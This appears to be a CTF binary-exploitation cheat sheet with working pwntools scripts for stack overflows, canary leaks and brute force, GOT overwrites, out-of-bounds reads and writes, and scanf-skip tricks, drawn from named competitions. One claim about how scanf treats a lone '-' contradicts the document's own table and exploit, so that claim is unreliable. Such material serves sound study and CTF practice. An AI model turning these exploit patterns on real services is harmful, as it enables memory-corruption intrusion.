# CTF Pwn - Overflow Basics

---

## Stack Buffer Overflow

1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

### ret2win with Parameter (Magic Value Check)

**Pattern:** Win function checks argument against magic value before printing flag.

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**Exploitation (x86-64):** `p64(ret)` (16-byte alignment) then
`p64(pop_rdi) + p64(magic) + p64(win)`; the offset is `rbp - buffer` plus 8.

**Finding the win function:**
- Search for `fopen("flag.txt")` or similar in Ghidra
- Look for functions with no XREF that check a magic parameter
- Check for conditional print/exit patterns after parameter comparison

### Input Filtering (memmem checks)

Some challenges filter input using `memmem()` to block certain strings:
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.

**Struct layout example:**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**Exploitation:**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT target selection strategy:**
- Identify which libc functions the `win` function calls internally
- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
- Prefer functions called in the main loop AFTER the write

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## Signed Integer Bypass (Negative Quantity)

`scanf("%d")` without sign check; negative input bypasses unsigned comparisons. See [advanced-exploits.md](advanced-exploits.md#signed-integer-bypass-negative-quantity) for full details.

## Canary-Aware Partial Overflow

Overflow `valid` flag between buffer and canary without touching the canary. Use `./` as no-op path padding for precise length control. See [advanced-exploits.md](advanced-exploits.md#canary-aware-partial-overflow) for full exploit chain.

## OOB Read via Stride/Rate Leak (DiceCTF 2026)

**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).

**Stack layout:**
```text
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**Vulnerable pattern:**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**Exploitation:**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.

**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.

## Stack Canary Byte-by-Byte Brute Force on Forking Servers

**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.

**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.

**Exploitation:**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**Prerequisites:**
- Server must `fork()` per connection (canary stays constant across children)
- Overflow must be controllable byte-by-byte (no all-at-once read)
- Distinguishable crash vs success response (timeout, error message, or connection behavior)

**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.

**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).

---

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.

---

## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)

Custom network protocols that echo data based on a length field in the request header can leak stack memory when the length exceeds the actual data sent (similar to Heartbleed).

```python
from pwn import *

# Custom protocol: [4-byte magic][1-byte length][payload]
# Server echoes back `length` bytes of the response buffer
# If length > actual payload, server leaks stack/heap memory

io = remote('target.ctf', 1337)

# Normal request: 5 bytes of data, length = 5
# Bleeding request: 5 bytes of data, length = 255
magic = b'\x00\x01\x02\x03'
length_field = b'\xff'  # request 255 bytes back
payload = b'AAAAA'      # only send 5 bytes

io.send(magic + length_field + payload)
leaked = io.recv(255)

# Search leaked memory for flag pattern
if b'flag{' in leaked or b'CTF{' in leaked:
    log.success(f"Flag found in leaked data!")

# Alternatively, search for addresses (libc pointers, stack addresses)
for i in range(0, len(leaked) - 8, 8):
    addr = u64(leaked[i:i+8])
    if 0x7f0000000000 < addr < 0x7fffffffffff:
        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
```

**Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.

---

## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)

**Pattern (PCAP Trap):** Custom file parser (e.g., PCAP, image, archive) allocates a fixed-size stack buffer but allows input records with lengths exceeding the buffer. A `memcpy` copies the full record into the stack buffer before length validation, overwriting saved registers and return address.

```python
from pwn import *

# Example: PCAP parser with 0x10000 byte stack buffer
# but PCAP packets can specify up to 0x20000 bytes (snaplen)
# memcpy(stack_buf, packet_data, packet_len) has no bounds check

elf = ELF('./pcap_parser')
context.binary = elf

# Step 1: Determine overflow offset
# Buffer is 0x10000 bytes on stack
# After buffer: saved callee-save registers (rbx, r12, ...) then return address
BUF_SIZE = 0x10000
# Offset to saved registers depends on function prologue
# Check disassembly: push rbx; push r12; sub rsp, 0x10000
OFFSET_RBX = BUF_SIZE       # first saved register
OFFSET_R12 = BUF_SIZE + 8   # second saved register
OFFSET_RET = BUF_SIZE + 16  # return address

# Step 2: Craft payload with register restoration
# Callee-saved registers must be valid or the function epilogue crashes
# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
# r12: set to value that exits cleanly (e.g., loop terminator = 1)

bss_addr = elf.bss()         # Readable memory for rbx
win_addr = elf.symbols['win'] # Target function

payload = b'A' * BUF_SIZE
payload += p64(bss_addr)      # rbx -> valid readable address
payload += p64(1)             # r12 = 1 (loop exit condition)
payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
payload += p64(win_addr)      # return to win()

# Step 3: Wrap in valid file format container
# For PCAP: valid global header + packet header with large caplen
import struct

# PCAP global header
pcap_header = struct.pack('<IHHIIII',
    0xa1b2c3d4,  # magic number
    2, 4,        # version 2.4
    0,           # thiszone
    0,           # sigfigs
    0x20000,     # snaplen (max packet size - larger than stack buffer!)
    1            # network (LINKTYPE_ETHERNET)
)

# PCAP packet record header
pkt_ts_sec = 0
pkt_ts_usec = 0
pkt_caplen = len(payload)   # captured length = our overflow payload
pkt_origlen = len(payload)

pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)

# Build malicious PCAP
pcap_data = pcap_header + pkt_header + payload

with open('exploit.pcap', 'wb') as f:
    f.write(pcap_data)

# Step 4: Send to target
p = remote('target', 1337)
p.send(pcap_data)
p.interactive()
```

**Key insight:** Custom file parsers often allocate fixed-size stack buffers based on a "maximum expected size" but the file format allows specifying larger records. The `memcpy` happens before the length check, creating a classic stack overflow. When exploiting, you must restore callee-saved registers to valid values in the overflow payload -- the function epilogue pops them before returning, and invalid values cause crashes before the return address is reached. Common requirements: `rbx` must point to readable memory (use BSS), loop counter registers must satisfy exit conditions.

**Callee-saved register restoration checklist:**
1. Identify which registers the function pushes in its prologue (`push rbx`, `push r12`, etc.)
2. Determine the order they are restored in the epilogue (reverse of push order)
3. Set `rbx` to any readable address (BSS, GOT, or known mapped page)
4. Set loop counters (`r12`, `r13`) to values that terminate any loops cleanly
5. Add a `ret` gadget for 16-byte stack alignment before the win function address

**When to recognize:** Challenge involves a custom parser for a binary file format (PCAP, ELF, image, protocol buffer). The parser uses `memcpy` or `read` with a length field from the input. Check if the buffer size is smaller than the maximum length the format allows.

**References:** MetaCTF Flash CTF 2026 "PCAP Trap"

---

## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)

**Pattern:** Stack canaries always end with a null byte (the low byte is `\x00`) to prevent string-based leaks. If an overflow allows overwriting just that null byte with a non-null character, `puts()` or `printf("%s")` will continue printing past the overwritten byte and output the remaining 7 canary bytes. A return-to-main provides a second exploitation stage where the full canary is known.

**Stack layout:**
```text
[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
                  ^--- overwrite only this byte with 'A'
                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
```

**Exploitation:**
```python
from pwn import *

# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
leak = p.recvline()
# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
canary_val = u64(canary)
log.info(f"Leaked canary: {hex(canary_val)}")

# Stage 2: Return-to-main for clean second exploitation
# First stage payload returned to main() — now build full ROP chain
p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
```

**Why return-to-main:** After leaking the canary by overwriting its null byte, the canary is corrupted — the process will crash on return. Return-to-main (via a first-stage overflow) resets the stack frame cleanly and allows a second input with the now-known canary value.

**Key insight:** The canary's null byte terminator is a weakness — overwriting only it makes string functions print the canary value. Return-to-main provides a second exploitation opportunity with the leaked canary, enabling full ROP chain construction.

**References:** CSAW 2017

---

## Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)

**Pattern:** A MAC or auth token check extracts `n` (comparison length) from a user-supplied field and then calls `strncmp(expected, supplied, n)`. When `n == 0`, `strncmp` returns 0 regardless of input — every token is accepted.

**Vulnerable code:**
```c
int n = atoi(user_len);            // attacker controls length
if (strncmp(expected_mac, user_mac, n) == 0) {
    grant_access();
}
```

**Exploit:** Send the token with `len=0` (or a length field that parses to zero) and an arbitrary MAC.

**Key insight:** Any variable-length comparator (`strncmp`, `memcmp`, `bcmp`) returns equality for zero-length input. Validate the length separately: reject `n <= 0`, or use `CRYPTO_memcmp`/`hmac_equal` and compare full fixed-size buffers. The same bug appears when the length comes from a client-supplied HMAC size or TLV header.

**References:** UCSB iCTF 2018 — writeup 10009

---

## Return Address LSB Overwrite + read() Chaining (TUCTF 2018)

**Pattern:** `read(0, buf, 0x80)` overflows into the saved return address by exactly one byte (off-by-one in the read size). Overwriting only the LSB keeps the high bytes intact, so you land a few bytes earlier in the same function. Pick a byte that points inside the function prologue before another `read()` call — it fires again with attacker-controlled args.

```python
# Offset 29 in the buffer = saved RIP LSB
payload = b'\x15' * 29     # 0x56555d22 -> 0x56555d15 (inside read() prologue)
p.sendline(payload)

# Second read call now reads into &password with length 0x2b
p.send(p32(0) + p32(password_addr) + p32(0x2b))
```

**Key insight:** A one-byte ret overwrite reused as a "call this function again" primitive is often stronger than a full ROP, because you bypass ASLR entirely — you jump to an instruction already at a known relative offset.

**References:** TUCTF 2018 — Lisa, writeup 12339

---

## Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)

**Pattern:** glibc stack canaries always start with `0x00` so that `strcpy`/`printf("%s")` stops immediately. Send exactly `buf_size + 1` bytes; the `puts()` echo passes the canary's leading null and prints the remaining three bytes, giving you 3/4 of the canary.

```python
p.send(b'A' * (buf_size + 1))
leaked = p.recvline().rstrip(b'\n')
canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
```

**Key insight:** The canary byte that makes it "safe" against string operations is also the byte that enables the leak — replace it with a non-null byte, and the echo spills everything up to the next null.

**References:** hxp CTF 2018 — poor_canary, writeup 12568

---

## Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)

**Pattern:** Vulnerable function reads an index `v2`, checks `v2 <= 0xfc`, and writes `0xC` bytes at `array[12 * v2]`. The check covers the *index*, not the *computed byte offset*. Pick `v2` so `12 * v2` lands well past the buffer (saved RIP, canary, GOT).

```c
if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
```

Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array base.

**Key insight:** Every "bounded index" check must multiply by the element stride before comparing. Look for any `array[N*idx]` or struct-indexed writes where the check is only on `idx`; the effective bound is `max_offset / stride`.

**References:** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN, writeup 12041

---

## Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)

**Pattern:** `if (v5 <= 31) array[v5] = value;` compiles to a *signed* comparison. Passing `-1`, `-2`, ... passes the check and writes backward into preceding memory — typically the GOT or adjacent global structures.

```c
int v5 = atoi(input);     // signed
if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
```

Use negative indices to first leak libc (`read` GOT) and then overwrite a free GOT entry with `system`.

**Key insight:** Signed vs unsigned mismatches are everywhere. Always check the declared type; a `<= N` guard with a signed index is actually `[INT_MIN..N]`. Compile with `-Wsign-conversion` to catch this statically.

**References:** P.W.N. CTF 2018 — Kindergarten PWN, writeup 12041

---

## PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)

**Pattern:** Binary is PIE but two functions live in the same 4 KiB page: `fread_callback` at `base + 0x11BC` and `shell()` at `base + 0x11A9`. Page-relative offsets are fixed by the linker, so overwriting only the *low byte* of the stored function pointer on the stack rewrites `0xBC` → `0xA9` without needing any leak.

```python
p.send(b'A' * overflow_to_fp + b'\xa9')
```

**Key insight:** PIE randomises only page-aligned bits. Any two code addresses that share a page differ exclusively in the low 12 bits, so a single-byte overwrite is an ASLR-free partial overwrite whenever you can land the victim function in the same page during compilation.

**References:** P.W.N. CTF 2018 — Important Service, writeup 12041

---

## scanf Input Quirks (Skip, Truncate, Saturate)

**Pattern:** The target fills a stack array in a loop with `scanf("%d", &arr[i])` - usually with an off-by-one bound or a signed/unsigned loop counter - so later iterations walk over the canary and saved RIP. The canary is random and unprintable, so you cannot simply type it. scanf's conversion rules let you write exactly the slots you want and leave the rest untouched.

### What `%d` stores (glibc)

| Input | Stored value |
|---|---|
| `-2147483648` ... `2147483647` | exact |
| inside `long long` range (`-2^63` ... `2^63-1`) | low 32 bits only - high bits silently truncated |
| outside `long long` range | `-1` -> `0xFFFFFFFF` (saturation, not wrap) |
| optionally signed digits then junk, e.g. `1234abcd` | `1234`; scanning stops at the first non-digit |

Non-numeric input in a loop (one conversion per `scanf` call):

| Input | This call | Following calls |
|---|---|---|
| `+` or `-` alone | conversion fails, destination untouched | **stream stays usable** - the next scanf reads normally |
| any other non-digit (`a`, `0x10`, `...`) | conversion fails, destination untouched | offending byte is not consumed -> **every** later scanf fails, all remaining inputs ignored |
| digits then junk (`1234abcd`) | stores `1234` | junk stays buffered -> next scanf fails |

With one call taking several conversions (`scanf("%d %d %d", ...)`) the first failed conversion invalidates the remaining conversions **of that call only**; earlier ones are still assigned.

### Exploit recipe: skip the canary, keep writing past it

NewStar CTF 2024 *不思議なscanf*: the array is `int v6[6]`, but the loop is `for (i = 0; i <= 15; ++i) scanf("%d", &v6[i])`. Each conversion writes 4 bytes, so 64-bit slots line up as:

| index | location |
|---|---|
| 0-5 | declared array |
| 6-7 | stack canary |
| 8-9 | saved RBP |
| 10-11 | saved RIP |
| 12-15 | caller's frame |

Send `+` for every slot that must not change, and the win/one_gadget address for the RIP slots. No leak, no brute force:

```python
from pwn import *
io = process('./pwn')
WIN = 0x401240                                   # resolve from the binary
prompt = 'わたし、気になります！'

for i in range(16):
    if i in (10, 11):                            # little-endian 64-bit WIN across two ints
        io.sendlineafter(prompt, str((WIN >> (32 * (i - 10))) & 0xffffffff).encode())
    else:
        io.sendlineafter(prompt, b'+')           # leave this 4-byte slot untouched
io.interactive()
```

The same primitive appears as `scanf("%u", &arr[i])` in **pwnable.tw dubblesort**: `+`/`-` for the canary slot, numbers for the rest, and the bubble sort keeps the array ordered so the return address survives. See [dubblesort](../ctf-pwn-writeups/pwnable-tw/dubblesort.md) and the case study below.

### Other pwn-relevant scanf facts

- `%s` is as dangerous as `gets` (no width means an unbounded write) and, unlike `%d`, stops only at **whitespace** - a space inside a ROP chain splits the payload across conversions and corrupts the chain. Embedded NUL bytes are fine (scanf does not treat them as a terminator), so send raw bytes with `sendline`.
- `%c` does **not** skip leading whitespace, so `scanf("%d", &n); scanf("%c", &c)` reads the leftover `\n`. `scanf(" %c", &c)` and `scanf("\n%c", &c)` skip it; `scanf("%c\n", &c)` delays completion until a non-matching character arrives.
- `%u`, `%lld`, `%llu`, `%x`, `%f` share all of the above; the width of the destination moves the truncation and saturation thresholds accordingly.
- `%d` accepts a leading `+`/`-`, so `str(-1)` writes `0xffffffff` and negative decimals are a way to emit a high-bit-set 32-bit constant when the input filter rejects `0x` hex.
- The return value counts assigned conversions (`0` on matching failure, `EOF` at end of input) - usable as an oracle for "did this slot accept my value".
- Saturation to `-1` and long-long truncation are glibc behaviour (C leaves out-of-range conversion undefined); confirm against the challenge's libc before relying on it.

**When to recognize:** numeric menus or loops reading with `%d`/`%u`, a loop bound one too large or driven by a signed/unsigned mismatch, or a check comparing against a positive constant while the value is parsed into a signed int.

**References:** NewStar CTF 2024 - 不思議なscanf (<https://newstar.wiki/wp/2024/week3/pwn/scanf>), "以 Pwn 视角看待 C 函数 —— scanf" (<https://blog.csdn.net/qq_54218833/article/details/121308367>), XCTF dubblesort

## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)

**Pattern (babypwn):** `coin_count` is compared as signed (`(char)count > 20` rejects only positive overflow) but iterated as unsigned (`for (uint8_t i = 0; i < count; ++i)`). Sending `128` passes the check yet loops 128 times, walking past a 20-slot int array, the stack canary, saved RBP, and saved RIP. The standard "leak the canary with the same bug" trick fails because the vulnerable `printf` fires only **after** the overflow loop. Instead, feed scanf an invalid-but-format-conforming token on the two canary iterations so scanf returns error **without consuming input and without writing** — the canary stays intact while subsequent iterations continue writing past it.

```python
from pwn import *

target.sendline('y')
target.sendline('2019')           # name
target.sendline('128')            # unsigned char > 20 passes signed check

# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
target.sendline(str(0))           # free@GOT upper 32 bits
# ... repeat for puts / setbuf / printf ...

for i in range(14):               # pad to reach canary slot (22 writes in)
    target.sendline('1')
    target.sendline('2')

target.sendline('-')              # "-" matches "%d" prefix but can't be a number
target.sendline('-')              # scanf returns error, leaves canary untouched
target.sendline('0')              # saved libc_csu_init slot - scratch
target.sendline('0')
target.sendline(str(0x400806))    # return address -> main() for stage 2
target.sendline(str(0))
```

**Key insight:** `scanf("%d", ...)` treats a lone `-` as a format mismatch — it returns early without writing to the destination and, crucially, without consuming the `-` byte; the next scanf call will then fail identically. Using this skip primitive you can surgically choose which iterations of a "fixed-count" write loop actually land on the stack, letting you hop over canary/RBP slots to reach the return address. Combine with a signed/unsigned char comparison bug to get a loop count larger than the declared max.

**References:** nullcon HackIM 2019 — babypwn, writeup 13211
